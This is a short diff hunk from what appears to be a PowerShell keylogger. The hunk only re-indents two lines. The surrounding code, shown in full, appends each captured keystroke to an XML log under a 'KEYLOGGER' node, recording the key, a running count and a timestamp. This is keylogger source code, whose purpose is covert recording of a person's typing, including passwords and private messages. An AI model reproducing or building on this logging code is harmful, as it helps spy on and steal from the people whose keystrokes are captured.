@@ -79,8 +79,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 							$xmlDoc = [System.Xml.XmlDocument](Get-Content $XML_Path);
 							$keyNode = $xmlDoc.CreateElement("KEYSTROKE")
 							$button = $xmlDoc.SelectSingleNode("//KEYLOGGER").AppendChild($keyNode)
-                            $totalNumber++
-                            $button.setAttribute("Number",$totalNumber)
+                            				$totalNumber++
+                            				$button.setAttribute("Number",$totalNumber)
 							$button.setAttribute("Button",$mychar)
 							$button.setAttribute("Time",$(get-date -format g))
 							$xmlDoc.Save($XML_Path)								
